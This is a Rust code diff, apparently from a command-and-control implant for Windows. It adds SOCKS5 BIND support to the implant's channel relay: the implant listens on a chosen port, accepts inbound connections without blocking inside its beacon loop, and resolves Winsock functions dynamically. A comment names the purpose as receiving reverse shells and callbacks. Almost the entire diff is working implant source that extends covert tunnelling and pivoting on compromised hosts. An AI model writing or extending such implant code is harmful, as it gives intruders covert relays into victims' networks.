@@ -61,6 +61,9 @@ struct Timeval {
 struct Channel {
     chan: u32,
     sock: usize,
+    /// True for a SOCKS BIND listener (accepts inbound connections in
+    /// pump_channels). False for a connected/relay socket (recv-driven).
+    listening: bool,
 }
 
 /// The channel table. Fixed-size (a relay rarely needs more than a handful) so
@@ -153,9 +156,15 @@ unsafe fn slot_of(chan: u32) -> Option<usize> {
 /// Insert a new channel. Returns false if the table is full (the caller closes
 /// the socket — the Connect then reports a clean error instead of leaking).
 unsafe fn add_channel(chan: u32, sock: usize) -> bool {
+    unsafe { add_channel_kind(chan, sock, false) }
+}
+
+/// Insert a new channel with an explicit `listening` flag (true for a SOCKS
+/// BIND listener that pump_channels should accept on).
+unsafe fn add_channel_kind(chan: u32, sock: usize, listening: bool) -> bool {
     for i in 0..MAX_CHANNELS {
         if unsafe { CHANNELS[i] }.is_none() {
-            unsafe { CHANNELS[i] = Some(Channel { chan, sock }) };
+            unsafe { CHANNELS[i] = Some(Channel { chan, sock, listening }) };
             return true;
         }
     }
@@ -306,20 +315,131 @@ pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
     })
 }
 
-/// `Command::Socks { chan, op, addr, port }`. op 1 = SOCKS5 CONNECT (the common
-/// case) — opens a raw TCP socket to `addr:port` and keeps it as a channel; the
-/// SOCKS5 handshake itself is handled operator-side, so the implant just relays
-/// bytes. Other ops (bind 2, udp associate 3) are unsupported.
+/// `Command::Socks { chan, op, addr, port }`:
+/// - op 1 = SOCKS5 CONNECT (outbound TCP to addr:port, the common case)
+/// - op 2 = SOCKS5 BIND (listen on addr:port, accept inbound — reverse shells /
+///   callback receivers). The listener is kept as a `listening` channel that
+///   pump_channels accepts on; each accepted peer becomes its own new channel.
+/// - op 3 (UDP ASSOCIATE) is still unsupported.
+/// The SOCKS5 handshake itself is handled operator-side; the implant just
+/// provides the raw socket primitives and relays bytes.
 pub fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
     match op {
         1 => do_connect(0, addr, port, chan),
+        2 => do_bind(addr, port, chan),
         other => Response::Err({
             let mut e = String::from("socks: unsupported op ");
             push_decimal(&mut e, other as u32);
-            e.push_str(" (only connect=1)");
+            e.push_str(" (connect=1, bind=2)");
             e
         }),
     }
+}
+
+/// SOCKS5 BIND (op 2): bind + listen on `addr:port`, store as a `listening`
+/// channel. The first inbound connection accepted in pump_channels becomes a
+/// relay channel on the SAME chan id (mirroring SOCKS5 BIND semantics where the
+/// second reply carries the bound port and the first accepted peer is the
+/// connection). Returns `Channel { chan, status: 0 (open/listening) }`.
+fn do_bind(addr: &str, port: u16, chan: u32) -> Response {
+    if !unsafe { wsa_init() } {
+        return Response::Err(String::from("bind: winsock init failed"));
+    }
+    // Reuse the chan id: close any existing channel with this id first.
+    if let Some(idx) = unsafe { slot_of(chan) } {
+        if let Some(c) = unsafe { CHANNELS[idx] } {
+            if let Some(fns) = unsafe { ensure_relay() } {
+                let _ = unsafe { (fns.closesocket)(c.sock) };
+            }
+            unsafe { CHANNELS[idx] = None };
+        }
+    }
+
+    type SocketFn = unsafe extern "system" fn(i32, i32, i32) -> usize;
+    type BindFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
+    type ListenFn = unsafe extern "system" fn(usize, i32) -> i32;
+    type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
+    type InetAddr = unsafe extern "system" fn(*const u8) -> u32;
+
+    let socket_fn: SocketFn = match unsafe { export_addr(b"ws2_32.dll", b"socket") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Response::Err(String::from("bind: socket unresolved")),
+    };
+    let bind_fn: BindFn = match unsafe { export_addr(b"ws2_32.dll", b"bind") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Response::Err(String::from("bind: bind unresolved")),
+    };
+    let listen_fn: ListenFn = match unsafe { export_addr(b"ws2_32.dll", b"listen") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Response::Err(String::from("bind: listen unresolved")),
+    };
+    let ioctlsocket: IoctlSocket = match unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Response::Err(String::from("bind: ioctlsocket unresolved")),
+    };
+    let inet_addr: InetAddr = match unsafe { export_addr(b"ws2_32.dll", b"inet_addr") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Response::Err(String::from("bind: inet_addr unresolved")),
+    };
+
+    // Resolve the bind address. Empty/0.0.0.0/INADDR_ANY → bind all interfaces.
+    let ip = if addr.is_empty() {
+        0u32 // INADDR_ANY
+    } else {
+        let mut hostz = [0u8; 256];
+        let hn = addr.as_bytes().len().min(hostz.len() - 1);
+        hostz[..hn].copy_from_slice(&addr.as_bytes()[..hn]);
+        let a = unsafe { inet_addr(hostz.as_ptr()) };
+        if a == INADDR_NONE {
+            0u32 // fall back to INADDR_ANY on bad addr
+        } else {
+            a
+        }
+    };
+
+    let s = unsafe { socket_fn(AF_INET, SOCK_STREAM, 0) };
+    if s == INVALID_SOCKET {
+        return Response::Err(String::from("bind: socket() failed"));
+    }
+    // SO_REUSEADDR so re-binding after a close doesn't sit in TIME_WAIT.
+    type SetSockOpt = unsafe extern "system" fn(usize, i32, i32, *const u8, i32) -> i32;
+    if let Some(a) = unsafe { export_addr(b"ws2_32.dll", b"setsockopt") } {
+        let sso: SetSockOpt = unsafe { core::mem::transmute(a) };
+        let on: u32 = 1;
+        const SOL_SOCKET: i32 = 0xFFFF;
+        const SO_REUSEADDR: i32 = 0x0004;
+        let _ = unsafe { sso(s, SOL_SOCKET, SO_REUSEADDR, &on as *const u32 as *const u8, 4) };
+    }
+    let sa = SockAddrIn {
+        sin_family: AF_INET as u16,
+        sin_port: port.to_be(),
+        sin_addr: ip,
+        sin_zero: [0; 8],
+    };
+    const SOCKET_ERROR: i32 = -1;
+    let close = |sock: usize| {
+        if let Some(fns) = unsafe { ensure_relay() } {
+            let _ = unsafe { (fns.closesocket)(sock) };
+        }
+    };
+    if unsafe { bind_fn(s, &sa, 16) } == SOCKET_ERROR {
+        close(s);
+        return Response::Err(String::from("bind: bind() failed (port in use?)"));
+    }
+    // backlog 1 — SOCKS5 BIND expects a single callback connection.
+    if unsafe { listen_fn(s, 1) } == SOCKET_ERROR {
+        close(s);
+        return Response::Err(String::from("bind: listen() failed"));
+    }
+    // Non-blocking so accept in pump_channels never stalls the beacon loop.
+    let mut mode: u32 = 1;
+    let _ = unsafe { ioctlsocket(s, FIONBIO, &mut mode) };
+
+    if !unsafe { add_channel_kind(chan, s, true) } {
+        close(s);
+        return Response::Err(String::from("bind: channel table full"));
+    }
+    Response::Channel { chan, status: 0, data: Vec::new() }
 }
 
 // ---- ChannelData / ChannelClose / pump ------------------------------------
@@ -371,6 +491,37 @@ pub fn channel_close(chan: u32) -> Response {
     Response::Ok
 }
 
+/// Non-blocking accept on a listening socket. Returns Some(peer_fd) if a
+/// connection was accepted, None if no connection is pending (or accept
+/// failed). The peer socket is set non-blocking before returning so the relay
+/// recv loop never stalls.
+unsafe fn try_accept(listener: usize) -> Option<usize> {
+    type AcceptFn = unsafe extern "system" fn(usize, *mut SockAddrIn, *mut i32) -> usize;
+    type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
+    let accept_fn: AcceptFn = match unsafe { export_addr(b"ws2_32.dll", b"accept") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return None,
+    };
+    let mut addr = SockAddrIn {
+        sin_family: 0,
+        sin_port: 0,
+        sin_addr: 0,
+        sin_zero: [0; 8],
+    };
+    let mut addrlen: i32 = 16;
+    let peer = unsafe { accept_fn(listener, &mut addr, &mut addrlen) };
+    if peer == INVALID_SOCKET {
+        return None;
+    }
+    // Set the accepted peer non-blocking.
+    if let Some(a) = unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
+        let ioctlsocket: IoctlSocket = unsafe { core::mem::transmute(a) };
+        let mut mode: u32 = 1;
+        let _ = unsafe { ioctlsocket(peer, FIONBIO, &mut mode) };
+    }
+    Some(peer)
+}
+
 /// Drain every open channel's socket into `Response::Channel` frames for this
 /// beacon cycle. Called once per cycle by the beacon loop (before the POST).
 /// Per channel: `recv` non-blocking → `status: 1 (data)` with the bytes; `0`
@@ -389,6 +540,24 @@ pub fn pump_channels() -> Vec<Response> {
             i += 1;
             continue;
         };
+        // A listening channel (SOCKS BIND) is accept-driven, not recv-driven.
+        // Try a non-blocking accept; on a new peer, the listener stays open and
+        // the accepted socket becomes a normal relay channel on the SAME chan.
+        if c.listening {
+            let accepted = unsafe { try_accept(c.sock) };
+            if let Some(peer) = accepted {
+                // Reuse the listener's chan id for the accepted peer (SOCKS5
+                // BIND: the first accepted connection IS the relay). If the
+                // table is full, drop the peer.
+                if unsafe { add_channel_kind(c.chan, peer, false) } {
+                    out.push(Response::Channel { chan: c.chan, status: 0, data: Vec::new() });
+                } else {
+                    let _ = unsafe { (fns.closesocket)(peer) };
+                }
+            }
+            i += 1;
+            continue;
+        }
         let n = unsafe { (fns.recv)(c.sock, buf.as_mut_ptr(), buf.len() as i32, 0) };
         if n > 0 {
             let data: Vec<u8> = buf[..n as usize].to_vec();
